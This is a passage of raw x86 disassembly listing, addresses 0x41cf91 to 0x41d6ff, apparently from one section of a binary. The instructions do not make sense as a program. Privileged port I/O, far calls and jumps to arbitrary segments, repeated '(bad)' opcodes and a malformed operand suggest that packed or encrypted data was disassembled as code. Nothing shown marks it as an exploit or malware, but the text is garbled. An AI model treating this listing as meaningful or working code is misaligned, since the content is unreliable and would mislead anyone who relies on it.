  41cf91:	pusha  
  41cf92:	test   cl,al
  41cf94:	and    BYTE PTR [esi-0x15],bl
  41cf97:	mov    bh,0x62
  41cf99:	pushf  
  41cf9a:	jle    0x41cf45
  41cf9c:	xor    DWORD PTR [esi],ebx
  41cf9e:	xor    ebx,DWORD PTR [edi+0x26da8e1c]
  41cfa4:	push   ebp
  41cfa5:	cli    
  41cfa6:	adc    BYTE PTR [eax+0x4e],al
  41cfa9:	and    DWORD PTR [eax+esi*4],eax
  41cfac:	sbb    DWORD PTR [esi],ebp
  41cfae:	xchg   BYTE PTR [ebx+edx*4+0x33550d38],ah
  41cfb5:	push   ss
  41cfb6:	pop    ebp
  41cfb7:	push   ebx
  41cfb8:	call   0xd558:0xa65c9f2b
  41cfbf:	and    DWORD PTR [edi],edi
  41cfc1:	adc    eax,0xeaed2d78
  41cfc6:	adc    bl,BYTE PTR [edi+0x48]
  41cfc9:	test   al,0x42
  41cfcb:	out    0x65,al
  41cfcd:	pop    ecx
  41cfce:	add    DWORD PTR [ebx-0x299c1dec],0xa6a76ed0
  41cfd8:	outs   dx,DWORD PTR ds:[esi]
  41cfd9:	mov    esi,0x785c8442
  41cfde:	add    al,0x38
  41cfe0:	jnp    0x41d035
  41cfe2:	mov    bl,0xbf
  41cfe4:	mov    BYTE PTR [ebp+esi*1-0x69],bh
  41cfe8:	in     eax,dx
  41cfe9:	mov    dl,0x7f
  41cfeb:	or     eax,0x74d9db09
  41cff0:	and    esi,DWORD PTR [ecx]
  41cff2:	ss int 0x97
  41cff5:	int3   
  41cff6:	mov    ecx,0x1d4b7384
  41cffb:	ss push cs
  41cffd:	pop    ds
  41cffe:	sbb    eax,0x9f30dc6
  41d003:	test   BYTE PTR [esi],dl
  41d005:	mov    ds:0x8f54535,al
  41d00a:	inc    esp
  41d00b:	icebp  
  41d00c:	sub    DWORD PTR [eax],ebx
  41d00e:	jg     0x41cfdb
  41d010:	sub    DWORD PTR [ecx-0x5d],ebx
  41d013:	push   cs
  41d014:	fcomp  QWORD PTR [eax]
  41d016:	xchg   dl,dl
  41d018:	ffreep st(6)
  41d01a:	inc    esi
  41d01b:	in     eax,dx
  41d01c:	neg    DWORD PTR [eax+0x52]
  41d01f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d020:	jmp    0x963e:0xa04889f9
  41d027:	adc    al,0xd2
  41d029:	mov    ah,0x44
  41d02b:	sbb    BYTE PTR [eax],dl
  41d02d:	jne    0x41d029
  41d02f:	or     BYTE PTR [ebp-0x7f13dafc],bh
  41d035:	mov    ds:0xc6e114aa,eax
  41d03a:	shr    BYTE PTR [ecx+0x8ef9537],0x68
  41d041:	jae    0x41cfe0
  41d043:	out    0x9a,al
  41d045:	fmul   QWORD PTR [eax+0x4d]
  41d048:	mov    ecx,0x88298595
  41d04d:	mov    dh,0x3a
  41d04f:	dec    esp
  41d050:	enter  0x9f1b,0x93
  41d054:	cmc    
  41d055:	mov    cl,0x1d
  41d057:	and    DWORD PTR [eax],edx
  41d059:	dec    ecx
  41d05a:	ins    BYTE PTR es:[edi],dx
  41d05b:	icebp  
  41d05c:	push   edi
  41d05d:	adc    al,0x68
  41d05f:	xor    cl,BYTE PTR [eax-0x51]
  41d062:	pop    ebp
  41d063:	push   edx
  41d064:	fsubr  DWORD PTR [esi-0x9c1d834]
  41d06a:	dec    edi
  41d06b:	cwde   
  41d06c:	cli    
  41d06d:	add    dh,al
  41d06f:	mov    al,ds:0xf7c5d094
  41d074:	les    edi,FWORD PTR [eax+0x39afcc03]
  41d07a:	adc    BYTE PTR ds:0x8e5711c8,0xe5
  41d081:	pop    edx
  41d082:	enter  0xfb5e,0xfa
  41d086:	jmp    0xe16f821e
  41d08b:	int    0xe7
  41d08d:	jae    0x41d083
  41d08f:	sub    eax,DWORD PTR [ebp-0x1b16759d]
  41d095:	into   
  41d096:	aaa    
  41d097:	inc    ebx
  41d098:	je     0x41d079
  41d09a:	ja     0x41d0bd
  41d09c:	arpl   WORD PTR [esi+0x5d],dx
  41d09f:	adc    ah,BYTE PTR [ebx-0x3c]
  41d0a2:	dec    ebx
  41d0a3:	and    ah,0xc0
  41d0a6:	dec    edi
  41d0a7:	sbb    al,0x6f
  41d0a9:	mov    ds:0x5952e52e,al
  41d0ae:	loop   0x41d122
  41d0b0:	fwait
  41d0b1:	clc    
  41d0b2:	push   ebp
  41d0b3:	je     0x41d0cc
  41d0b5:	sti    
  41d0b6:	rep ins DWORD PTR es:[edi],dx
  41d0b8:	sti    
  41d0b9:	gs pushf 
  41d0bb:	retf   
  41d0bc:	ins    DWORD PTR es:[edi],dx
  41d0bd:	imul   ecx,DWORD PTR [esp+esi*4-0x400d92f8],0x2a
  41d0c5:	mov    al,ds:0xf2caef3c
  41d0ca:	inc    ebp
  41d0cb:	fiadd  DWORD PTR [ebp+0x2ecf6031]
  41d0d1:	mov    ch,0x7c
  41d0d3:	or     al,0x61
  41d0d5:	jae    0x41d106
  41d0d7:	repz adc BYTE PTR [ecx-0x3c5b88e7],bl
  41d0de:	mov    al,0xea
  41d0e0:	cs stc 
  41d0e2:	mov    esp,0x8f6a5f9f
  41d0e7:	pop    esp
  41d0e8:	stos   BYTE PTR es:[edi],al
  41d0e9:	scas   al,BYTE PTR es:[edi]
  41d0ea:	xor    eax,0xfefde121
  41d0ef:	jb     0x41d12e
  41d0f1:	dec    edx
  41d0f2:	dec    ebp
  41d0f3:	dec    ebp
  41d0f4:	push   es
  41d0f5:	jns    0x41d09f
  41d0f7:	addr16 push esi
  41d0f9:	arpl   ax,di
  41d0fb:	in     eax,0x71
  41d0fd:	std    
  41d0fe:	les    esp,FWORD PTR [esi+0x37]
  41d101:	out    dx,al
  41d102:	fisub  DWORD PTR [ecx+0x6]
  41d105:	inc    ebx
  41d106:	cmp    BYTE PTR [esi+eiz*1+0x70],ah
  41d10a:	int    0x44
  41d10c:	push   ss
  41d10d:	add    ecx,ebx
  41d10f:	icebp  
  41d110:	mov    edi,0x7f18a9ea
  41d115:	cmp    DWORD PTR [edx-0x5d],ebp
  41d118:	scas   al,BYTE PTR es:[edi]
  41d119:	cld    
  41d11a:	outs   dx,DWORD PTR ds:[esi]
  41d11b:	aad    0xe6
  41d11d:	jbe    0x41d111
  41d11f:	mov    eax,ds:0x4534635e
  41d124:	cs hlt 
  41d126:	cli    
  41d127:	out    0xc1,eax
  41d129:	icebp  
  41d12a:	push   ds
  41d12b:	xchg   BYTE PTR [edi],ch
  41d12d:	cli    
  41d12e:	or     DWORD PTR [esi-0x6f],eax
  41d131:	cmp    DWORD PTR [esi+esi*8+0xc25797b],ebx
  41d138:	xchg   DWORD PTR ds:0x992225ef,ebx
  41d13e:	cmp    bl,bh
  41d140:	dec    ebp
  41d141:	outs   dx,DWORD PTR ds:[esi]
  41d142:	dec    ecx
  41d143:	push   edi
  41d144:	stos   DWORD PTR es:[edi],eax
  41d145:	push   ecx
  41d146:	frstor [ecx-0x292fd24d]
  41d14c:	pop    es
  41d14d:	out    dx,eax
  41d14e:	mov    ch,0x2
  41d150:	je     0x41d112
  41d152:	pop    ebx
  41d153:	adc    dl,dh
  41d155:	shl    BYTE PTR [edx-0x584966d8],1
  41d15b:	arpl   WORD PTR [edi+0x6a],sp
  41d15e:	nop
  41d15f:	mov    bh,0xbf
  41d161:	xchg   ebp,eax
  41d162:	mov    edx,edi
  41d164:	mov    esi,0xb1105305
  41d169:	setle  BYTE PTR [ecx+0x2b]
  41d16d:	addps  xmm0,XMMWORD PTR [eax]
  41d170:	loop   0x41d189
  41d172:	fsubr  QWORD PTR [ebx-0x192483fa]
  41d178:	inc    esi
  41d179:	cmp    BYTE PTR ss:[edi+0x1e],0x86
  41d17e:	lock xchg BYTE PTR [edi-0x2457fb43],al
  41d185:	mov    eax,ds:0xbf765239
  41d18a:	in     al,dx
  41d18b:	mov    BYTE PTR [edx],dl
  41d18d:	jl     0x41d1a3
  41d18f:	in     eax,dx
  41d190:	jecxz  0x41d1bf
  41d192:	not    DWORD PTR [ebx*2-0x15eb175b]
  41d199:	cli    
  41d19a:	lods   al,BYTE PTR ds:[esi]
  41d19b:	fld    DWORD PTR [ecx-0x47e2b2af]
  41d1a1:	stos   DWORD PTR es:[edi],eax
  41d1a2:	call   0x1d8a:0x76398ea6
  41d1a9:	adc    bl,BYTE PTR [esi+0x655a3d75]
  41d1af:	addr16 popa 
  41d1b1:	xchg   esp,eax
  41d1b2:	push   ds
  41d1b3:	lock fwait
  41d1b5:	xchg   esp,eax
  41d1b6:	add    ecx,DWORD PTR [eax]
  41d1b8:	sbb    al,0xdf
  41d1ba:	inc    ebx
  41d1bb:	and    bl,ah
  41d1bd:	imul   ebx,eax,0xffffffe3
  41d1c0:	pop    eax
  41d1c1:	and    DWORD PTR [esi-0x46b68929],edi
  41d1c7:	xchg   ebp,eax
  41d1c8:	test   bl,dh
  41d1ca:	je     0x41d1d9
  41d1cc:	repz jecxz 0x41d1c7
  41d1cf:	or     BYTE PTR [esi],0xcf
  41d1d2:	adc    edx,DWORD PTR [edi+0x28604be6]
  41d1d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1d9:	add    DWORD PTR [ecx-0x64],0xb841877a
  41d1e0:	hlt    
  41d1e1:	imul   esp,ebx,0xffffffc2
  41d1e4:	pop    ds
  41d1e5:	xchg   ecx,eax
  41d1e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1e7:	test   BYTE PTR [ebp-0x8],dl
  41d1ea:	mov    ah,0x92
  41d1ec:	stc    
  41d1ed:	cdq    
  41d1ee:	jno    0x41d18e
  41d1f0:	aaa    
  41d1f1:	xchg   ecx,eax
  41d1f2:	stos   BYTE PTR es:[edi],al
  41d1f3:	daa    
  41d1f4:	ret    0xaabd
  41d1f7:	lods   al,BYTE PTR ds:[esi]
  41d1f8:	jmp    FWORD PTR [esi-0x6dd6beab]
  41d1fe:	into   
  41d1ff:	(bad)  
  41d200:	mov    eax,0x6f30187b
  41d205:	mov    esp,0x2960f294
  41d20a:	les    ebx,FWORD PTR [ebx+0x70]
  41d20d:	pop    ecx
  41d20e:	mov    edx,0xc5233c69
  41d213:	mov    ecx,0xa41ce240
  41d218:	scas   al,BYTE PTR es:[edi]
  41d219:	data16 jecxz 0x41d21f
  41d21c:	ret    0xc78a
  41d21f:	xchg   edx,eax
  41d220:	push   cs
  41d221:	into   
  41d222:	out    dx,al
  41d223:	mov    dh,BYTE PTR [esi+0x2f]
  41d226:	and    DWORD PTR [ebx+0x39],ecx
  41d229:	retf   0x7840
  41d22c:	push   eax
  41d22d:	std    
  41d22e:	sub    BYTE PTR [ecx+0x5684ff87],cl
  41d234:	call   0xcd2:0x772df44
  41d23b:	mov    bh,0x5f
  41d23d:	pop    edi
  41d23e:	cmc    
  41d23f:	push   eax
  41d240:	xchg   ebp,eax
  41d241:	cmp    DWORD PTR [ebx+ecx*1],ebp
  41d244:	pop    edx
  41d245:	fidivr DWORD PTR [edx+eiz*8+0x42]
  41d249:	stc    
  41d24a:	ret    
  41d24b:	in     eax,0xeb
  41d24d:	ror    DWORD PTR [ecx],cl
  41d24f:	fldcw  WORD PTR [edi+eax*4-0x35]
  41d253:	scas   eax,DWORD PTR es:[edi]
  41d254:	fcmovne st,st(4)
  41d256:	inc    ecx
  41d258:	pop    esp
  41d259:	stc    
  41d25a:	push   ecx
  41d25b:	loope  0x41d237
  41d25d:	pusha  
  41d25e:	leave  
  41d25f:	sub    eax,0xb69f2d31
  41d264:	jmp    0x41d2bf
  41d266:	ret    
  41d267:	out    dx,al
  41d268:	ret    
  41d269:	fnsave [eax+ebp*4-0x699cf732]
  41d270:	fnsave [edx]
  41d272:	cmp    eax,0xc6b02276
  41d277:	xchg   ebp,eax
  41d278:	inc    edi
  41d279:	pop    esp
  41d27a:	aas    
  41d27b:	sti    
  41d27c:	retf   
  41d27d:	jecxz  0x41d2b2
  41d27f:	push   es
  41d280:	popa   
  41d281:	jecxz  0x41d2cd
  41d283:	push   es
  41d284:	enter  0x7372,0x40
  41d288:	test   BYTE PTR [ebp+0x2862fbfa],ch
  41d28e:	pop    ebp
  41d28f:	adc    dl,cl
  41d291:	cmpxchg BYTE PTR [ecx+0x34537b8d],bl
  41d298:	cmp    al,BYTE PTR [esi+0x78d54b8f]
  41d29e:	xor    eax,0xe7c9bd76
  41d2a3:	(bad)
  41d2a8:	das    
  41d2a9:	and    edi,edi
  41d2ab:	push   edx
  41d2ac:	add    eax,0xd8d61d31
  41d2b1:	or     DWORD PTR [ecx-0x23],0xffffffc2
  41d2b5:	dec    ebx
  41d2b6:	fcom   st(6)
  41d2b8:	frstor [eax-0x17]
  41d2bb:	mov    ecx,0xd0dab186
  41d2c0:	dec    bx
  41d2c2:	out    dx,eax
  41d2c3:	push   0x146e8d8c
  41d2c8:	mov    gs,WORD PTR [ecx]
  41d2ca:	cmp    esi,ebp
  41d2cc:	or     BYTE PTR [esi],al
  41d2ce:	js     0x41d31a
  41d2d0:	and    DWORD PTR [eax+0x207f6be9],ebx
  41d2d6:	int    0xf3
  41d2d8:	sbb    DWORD PTR [edi+0x54a1d2dc],edx
  41d2de:	sbb    ecx,ecx
  41d2e0:	jp     0x41d276
  41d2e2:	mov    ds:0x4608809f,eax
  41d2e7:	xor    DWORD PTR [ecx+edx*8],ebp
  41d2ea:	sub    al,bl
  41d2ec:	jmp    0x41d2c2
  41d2ee:	loop   0x41d2ac
  41d2f0:	icebp  
  41d2f1:	jnp    0x41d33e
  41d2f3:	jg     0x41d316
  41d2f5:	mov    esp,0x2bc7a00a
  41d2fa:	neg    BYTE PTR [edx-0x4c]
  41d2fd:	(bad)  [edx+0x9]
  41d300:	daa    
  41d301:	mov    eax,0x5ff66c4a
  41d306:	(bad)  
  41d307:	repz xor edi,esi
  41d30a:	cld    
  41d30b:	test   DWORD PTR [edi],edx
  41d30d:	xchg   ebx,eax
  41d30e:	sub    eax,0x751dc5b4
  41d313:	icebp  
  41d314:	xor    eax,0x722e00d3
  41d319:	jns    0x41d2af
  41d31b:	das    
  41d31c:	pop    ebp
  41d31d:	xchg   esp,eax
  41d31e:	out    dx,al
  41d31f:	add    ch,0xfa
  41d322:	mov    al,0x1
  41d324:	and    ebp,DWORD PTR [esi+0x180301f4]
  41d32a:	shr    BYTE PTR [esi+0x75],1
  41d32d:	xchg   edx,eax
  41d32e:	fs pop edx
  41d330:	test   DWORD PTR [esi+ebp*4+0x2af87fd8],ecx
  41d337:	dec    ebx
  41d338:	shl    BYTE PTR [ebx+0x7f166c2],1
  41d33e:	xor    esp,esp
  41d340:	es cmp cl,ah
  41d343:	add    DWORD PTR [edi+0x257da740],0x78f8218b
  41d34d:	call   0xd23e:0x94564c5c
  41d354:	mov    ss,ebp
  41d356:	xchg   edx,eax
  41d357:	icebp  
  41d358:	dec    esp
  41d359:	xor    al,0x2c
  41d35b:	push   ebp
  41d35c:	rcl    esi,0x23
  41d35f:	shl    edx,cl
  41d361:	out    0x8b,eax
  41d363:	cld    
  41d364:	lea    esi,[esi+eiz*4+0x3a]
  41d368:	(bad)  
  41d369:	repnz mov esp,DWORD PTR cs:[esi]
  41d36d:	sub    al,0xd6
  41d36f:	jl     0x41d345
  41d371:	inc    esp
  41d372:	add    al,0xf6
  41d374:	add    DWORD PTR [ecx+0x13f91978],edx
  41d37a:	in     al,dx
  41d37b:	jge    0x41d392
  41d37d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d37e:	or     al,0xea
  41d380:	cli    
  41d381:	push   esi
  41d382:	adc    eax,0xea779e03
  41d387:	in     al,0xaa
  41d389:	mov    ds:0x98a884d5,eax
  41d38e:	jmp    0x78dc:0xc838aa91
  41d395:	div    DWORD PTR [ebx+0x11904846]
  41d39b:	jp     0x41d3eb
  41d39d:	cmp    eax,0x87ef2f8b
  41d3a2:	xor    bl,bh
  41d3a4:	into   
  41d3a5:	imul   ecx,DWORD PTR [edx-0x48b88a9e],0xffffffed
  41d3ac:	xor    dh,dh
  41d3ae:	add    esi,ecx
  41d3b0:	fwait
  41d3b1:	mov    ah,BYTE PTR [ebp+0x782e4be0]
  41d3b7:	or     al,0x27
  41d3b9:	xchg   ebp,eax
  41d3ba:	scas   eax,DWORD PTR es:[edi]
  41d3bb:	and    edi,edx
  41d3bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3be:	popf   
  41d3bf:	(bad)
  41d3c4:	and    BYTE PTR [ebp+0x70],dl
  41d3c7:	ficomp WORD PTR ds:0x9d5bbb3a
  41d3cd:	fnstcw WORD PTR [edi+0x4fa6fcd3]
  41d3d3:	test   DWORD PTR [ecx],esi
  41d3d5:	(bad)  
  41d3d6:	pop    esp
  41d3d7:	pop    ebp
  41d3d8:	rcl    DWORD PTR [ebx-0x3b],0x36
  41d3dc:	jns    0x41d368
  41d3de:	add    esp,DWORD PTR [edi-0x42be532c]
  41d3e4:	inc    ebx
  41d3e5:	jns    0x41d3a3
  41d3e7:	and    DWORD PTR [edx],ecx
  41d3e9:	cmp    esi,esi
  41d3eb:	sub    eax,0x540a4c52
  41d3f0:	shl    BYTE PTR [ebx],0x79
  41d3f3:	jmp    0x41d470
  41d3f5:	sub    eax,0xbc289d4f
  41d3fa:	(bad)  
  41d3fb:	lahf   
  41d3fc:	neg    esi
  41d3fe:	std    
  41d3ff:	imul   DWORD PTR [esi+edx*8-0x2a]
  41d403:	popf   
  41d404:	add    dh,ch
  41d406:	(bad)  
  41d407:	fidiv  DWORD PTR [ebx]
  41d409:	jl     0x41d450
  41d40b:	aam    0x40
  41d40d:	loopne 0x41d426
  41d40f:	cmp    BYTE PTR [ebp+0x3d],dh
  41d412:	aad    0xa7
  41d414:	cmc    
  41d415:	fsubr  DWORD PTR [ebx-0x7f0c420e]
  41d41b:	push   0x64
  41d41d:	and    ebx,DWORD PTR [edi+0x6296b490]
  41d423:	dec    esi
  41d424:	inc    edx
  41d425:	mov    al,0xca
  41d427:	push   ebx
  41d428:	mov    esp,0x149c88a6
  41d42d:	rol    BYTE PTR [ebp+0x33d5feca],cl
  41d433:	xor    BYTE PTR [esi-0x5e10be3e],ch
  41d439:	cmc    
  41d43a:	cmp    al,0x37
  41d43c:	scas   eax,DWORD PTR es:[edi]
  41d43d:	inc    eax
  41d43e:	mov    edi,0x11034b67
  41d443:	pop    esi
  41d444:	call   0xfc7832be
  41d449:	mov    al,ds:0x6a2398b1
  41d44e:	push   es
  41d44f:	xchg   edi,eax
  41d450:	inc    edx
  41d451:	scas   al,BYTE PTR es:[edi]
  41d452:	std    
  41d453:	div    DWORD PTR [eax]
  41d455:	test   eax,0x423b048e
  41d45a:	cs dec edx
  41d45c:	adc    al,BYTE PTR [edi+0x189f04ae]
  41d462:	jle    0x41d4a7
  41d464:	stos   DWORD PTR es:[edi],eax
  41d465:	xlat   BYTE PTR ds:[ebx]
  41d466:	inc    DWORD PTR [ebx-0x17]
  41d469:	push   ss
  41d46a:	mov    BYTE PTR [eax+0x10],ah
  41d46d:	sbb    BYTE PTR [eax+0x4],ah
  41d470:	or     DWORD PTR ds:0xab3b5d11,ebx
  41d476:	sbb    edx,ebx
  41d478:	inc    ebp
  41d479:	adc    eax,DWORD PTR [ebp-0x60]
  41d47c:	jae    0x41d459
  41d47e:	sbb    ecx,eax
  41d480:	push   0x112d8c18
  41d485:	adc    cl,BYTE PTR [eax]
  41d487:	(bad)  
  41d488:	jge    0x41d463
  41d48a:	push   ebp
  41d48b:	xor    BYTE PTR [ebp+ebp*8-0x28],ah
  41d48f:	cmp    ecx,DWORD PTR [eax]
  41d491:	dec    BYTE PTR [edi+0x1]
  41d494:	scas   eax,DWORD PTR es:[edi]
  41d495:	cwde   
  41d496:	adc    BYTE PTR [esi+0x7c],bh
  41d499:	jo     0x41d4d6
  41d49b:	cli    
  41d49c:	jno    0x41d4ac
  41d49e:	jmp    0x58e4:0xc2b4015c
  41d4a5:	pmovmskb edx,mm0
  41d4a8:	repnz cmp dh,ch
  41d4ab:	aad    0xe0
  41d4ad:	mov    esp,0x5935a24d
  41d4b2:	(bad)  
  41d4b3:	call   0xe9d1290a
  41d4b8:	sbb    eax,0xeb4eea9d
  41d4bd:	dec    edx
  41d4be:	add    al,0xe5
  41d4c1:	test   BYTE PTR ds:0x9fb24c97,dh
  41d4c7:	jmp    0x41d4ed
  41d4c9:	call   0x8b2555b5
  41d4ce:	retf   0x98f1
  41d4d1:	cld    
  41d4d2:	outs   dx,DWORD PTR ds:[esi]
  41d4d3:	sbb    dh,dl
  41d4d5:	(bad)  
  41d4d6:	fmul   DWORD PTR [edi]
  41d4d8:	cld    
  41d4d9:	(bad)  
  41d4da:	cld    
  41d4db:	dec    edi
  41d4dc:	add    dl,BYTE PTR [ecx+0x211f8a55]
  41d4e2:	pop    ss
  41d4e3:	hlt    
  41d4e4:	mov    cl,0x83
  41d4e6:	sub    al,0xf6
  41d4e8:	mov    ds:0x601421ef,eax
  41d4ed:	mov    bh,0x2c
  41d4ef:	mov    ss,WORD PTR [ebp-0x70]
  41d4f2:	pop    ebp
  41d4f3:	xchg   DWORD PTR [eax-0x530e4ff4],edx
  41d4f9:	jle    0x41d49c
  41d4fb:	and    DWORD PTR [ebx+0x5],ecx
  41d4fe:	jne    0x41d544
  41d500:	enter  0x15e2,0x4d
  41d504:	add    BYTE PTR [edx+0xe],ah
  41d507:	pop    esi
  41d508:	aam    0xad
  41d50a:	dec    ebx
  41d50b:	or     ebx,DWORD PTR [esi-0x366cff0f]
  41d511:	or     al,0x96
  41d513:	test   edx,esi
  41d515:	jg     0x41d4d9
  41d517:	mov    bl,0xa8
  41d519:	xor    al,0x92
  41d51b:	or     ecx,DWORD PTR [ebx-0x6df7549f]
  41d521:	mov    cl,0x15
  41d523:	lods   eax,DWORD PTR ds:[esi]
  41d524:	aad    0x14
  41d526:	dec    eax
  41d527:	js     0x41d565
  41d529:	in     eax,0x3a
  41d52b:	push   edi
  41d52c:	scas   al,BYTE PTR es:[edi]
  41d52d:	and    al,0x55
  41d52f:	jns    0x41d4dd
  41d531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d532:	mov    edx,0xffef1ede
  41d537:	cmp    esi,DWORD PTR [ebx+ebp*1-0x263763c4]
  41d53e:	mov    bh,BYTE PTR [eax-0x2e]
  41d541:	fisubr WORD PTR [edx]
  41d543:	inc    esi
  41d544:	sub    ebp,DWORD PTR [eax]
  41d546:	fincstp 
  41d548:	test   DWORD PTR [ebx+0x3ec29af6],ebx
  41d54e:	pop    ss
  41d54f:	call   0x21ad:0xf622244
  41d556:	(bad)  
  41d557:	push   edx
  41d558:	(bad)  
  41d559:	cmp    ecx,DWORD PTR [edx]
  41d55b:	inc    eax
  41d55c:	inc    eax
  41d55d:	faddp  st(4),st
  41d55f:	pop    ecx
  41d560:	ret    
  41d561:	xor    eax,0x5f1d83b9
  41d566:	dec    di
  41d568:	push   ss
  41d569:	les    ebp,FWORD PTR [ebp-0x11]
  41d56c:	out    0x9f,eax
  41d56e:	push   esi
  41d56f:	sub    ah,dl
  41d571:	xchg   ecx,eax
  41d572:	fucom  st(0)
  41d574:	sub    edi,DWORD PTR ss:[edx+ebx*1-0x7ee492e6]
  41d57c:	pop    ecx
  41d57d:	lock or DWORD PTR [ebp-0x25],eax
  41d581:	fisttp DWORD PTR [ebx-0x80]
  41d584:	dec    esi
  41d585:	fisttp QWORD PTR [esi]
  41d587:	jns    0x41d583
  41d589:	sub    BYTE PTR [ebx-0x15071bb8],cl
  41d58f:	outs   dx,BYTE PTR ds:[esi]
  41d590:	repz and al,0x90
  41d593:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d594:	mov    eax,ds:0x8addf858
  41d599:	sbb    BYTE PTR [esi],cl
  41d59b:	and    edx,esp
  41d59d:	jmp    0x41d5a7
  41d59f:	arpl   WORD PTR [ebx+eax*2-0x4b065c46],bx
  41d5a6:	mov    BYTE PTR [edi-0x22c2dcb2],al
  41d5ac:	ss leave 
  41d5ae:	add    bh,BYTE PTR [ebx]
  41d5b0:	dec    ebp
  41d5b1:	pusha  
  41d5b2:	push   es
  41d5b3:	retf   0xe8dd
  41d5b6:	loope  0x41d623
  41d5b8:	add    eax,0x5d3809e9
  41d5bd:	xchg   edx,eax
  41d5be:	pop    edx
  41d5bf:	inc    ebp
  41d5c0:	push   ss
  41d5c1:	inc    esp
  41d5c2:	lods   al,BYTE PTR ds:[esi]
  41d5c3:	mov    ds:0x1c999464,eax
  41d5c8:	popa   
  41d5c9:	adc    al,0xa0
  41d5cb:	xchg   ebx,eax
  41d5cc:	pusha  
  41d5cd:	adc    esp,DWORD PTR [edi-0x43]
  41d5d0:	test   eax,0x4736c60c
  41d5d5:	xchg   edi,eax
  41d5d6:	jmp    0x40ed:0x56393182
  41d5dd:	fnsave [ebx-0x65]
  41d5e0:	bound  ecx,QWORD PTR [ebx+ebp*4]
  41d5e3:	jg     0x41d567
  41d5e5:	sahf   
  41d5e6:	mov    dl,0xe8
  41d5e8:	mov    WORD PTR ds:0xbf5ecbf0,ss
  41d5ee:	retf   
  41d5ef:	scas   al,BYTE PTR es:[edi]
  41d5f0:	scas   eax,DWORD PTR es:[edi]
  41d5f1:	fcom   DWORD PTR [edi+edi*2+0x5484b05e]
  41d5f8:	jmp    0x41d637
  41d5fa:	fsubp  st(2),st
  41d5fc:	retf   
  41d5fd:	dec    ebp
  41d5fe:	push   ds
  41d5ff:	setl   BYTE PTR [edx-0x36]
  41d603:	fcom   QWORD PTR [ebp+0x152feeeb]
  41d609:	sub    al,0x0
  41d60b:	sub    bl,BYTE PTR [ecx+0x2a]
  41d60e:	xchg   BYTE PTR [edx+0x22],bl
  41d611:	outs   dx,DWORD PTR ds:[esi]
  41d612:	daa    
  41d613:	sbb    ch,BYTE PTR [esi-0x51]
  41d616:	inc    ebx
  41d617:	es pop ds
  41d619:	mov    ecx,0x826e5646
  41d61e:	pop    esp
  41d61f:	test   eax,0xa3c16487
  41d624:	jl     0x41d607
  41d626:	add    al,0x5d
  41d628:	fsubr  DWORD PTR [ebx+0x31]
  41d62b:	call   0xcee4:0xba0d900f
  41d632:	mov    ds:0xdf65ea18,al
  41d637:	cmp    bl,BYTE PTR [edx+0x10]
  41d63a:	inc    ecx
  41d63b:	mov    eax,ds:0x77ecce5a
  41d640:	mov    edx,0xfbee10db
  41d645:	out    dx,eax
  41d646:	push   eax
  41d647:	xchg   edi,eax
  41d648:	or     al,0x2e
  41d64a:	xchg   ebp,eax
  41d64b:	dec    edx
  41d64c:	inc    ecx
  41d64d:	cmp    ebp,DWORD PTR [ebx-0x64]
  41d650:	dec    ebx
  41d651:	dec    ebx
  41d652:	mov    gs,WORD PTR [esp+ecx*4]
  41d655:	pop    es
  41d656:	arpl   WORD PTR [edi-0x6f],bp
  41d659:	adc    ebp,edi
  41d65b:	xchg   ecx,eax
  41d65c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d65d:	shr    BYTE PTR [edx+edi*2-0x7a],cl
  41d661:	xchg   DWORD PTR [ecx-0x7a],esp
  41d664:	pop    eax
  41d665:	dec    edi
  41d666:	call   0xa2fbc3f5
  41d66b:	jg     0x41d6eb
  41d66d:	cmp    eax,esi
  41d66f:	or     DWORD PTR [ebx+ebx*4-0x2793285],eax
  41d676:	xchg   ecx,eax
  41d677:	je     0x41d6d0
  41d679:	or     BYTE PTR [eax],0x36
  41d67c:	cld    
  41d67d:	xchg   ebx,ebx
  41d67f:	or     ah,dl
  41d681:	mov    bl,0x55
  41d683:	dec    edi
  41d684:	xlat   BYTE PTR ds:[ebx]
  41d685:	push   eax
  41d686:	fstp   DWORD PTR ds:0x5d27
  41d68b:	cmp    DWORD PTR [eax+0x115b7e83],ebx
  41d691:	lock xchg BYTE PTR [edx+ecx*2-0x1e],cl
  41d696:	fst    st(5)
  41d698:	xor    DWORD PTR [esi+eiz*8],ecx
  41d69b:	dec    ebp
  41d69c:	dec    eax
  41d69d:	xor    BYTE PTR [edi-0x437e0f5c],al
  41d6a3:	pop    edi
  41d6a4:	mov    ?,esi
  41d6a6:	jecxz  0x41d65c
  41d6a8:	pop    ecx
  41d6a9:	mov    dl,0xd1
  41d6ab:	sub    DWORD PTR [ecx-0x27],ebp
  41d6ae:	jmp    0x34a4224f
  41d6b3:	sbb    al,0x58
  41d6b5:	lods   eax,DWORD PTR ds:[esi]
  41d6b6:	jnp    0x41d72a
  41d6b8:	add    al,0x68
  41d6ba:	xchg   ebx,eax
  41d6bb:	jmp    0x41d71e
  41d6bd:	or     BYTE PTR [ebx],0x92
  41d6c0:	dec    ebx
  41d6c1:	jnp    0x41d737
  41d6c3:	rcl    DWORD PTR [edx],1
  41d6c5:	adc    ch,ch
  41d6c7:	imul   ebx,DWORD PTR [edx],0x24
  41d6ca:	lea    ebx,[ecx]
  41d6cc:	push   ds
  41d6cd:	xchg   esi,eax
  41d6ce:	test   dl,ah
  41d6d0:	jo     0x41d6e5
  41d6d2:	(bad)  
  41d6d3:	into   
  41d6d4:	jge    0x41d70c
  41d6d6:	retf   
  41d6d7:	jmp    0x620f:0x10ad7344
  41d6de:	mov    DWORD PTR [esi+0x7d416c7b],ecx
  41d6e4:	leave  
  41d6e5:	hlt    
  41d6e6:	out    dx,eax
  41d6e7:	shl    BYTE PTR [ebx+0x3f96cee1],0x0
  41d6ee:	dec    ebp
  41d6ef:	imul   edx,DWORD PTR [edi-0x77],0x3d
  41d6f3:	inc    eax
  41d6f4:	push   0xffffffa6
  41d6f6:	les    edi,FWORD PTR [ebp-0x4b6ce559]
  41d6fc:	sub    al,0x9b
  41d6fe:	lahf   
  41d6ff:	test   esi,esp
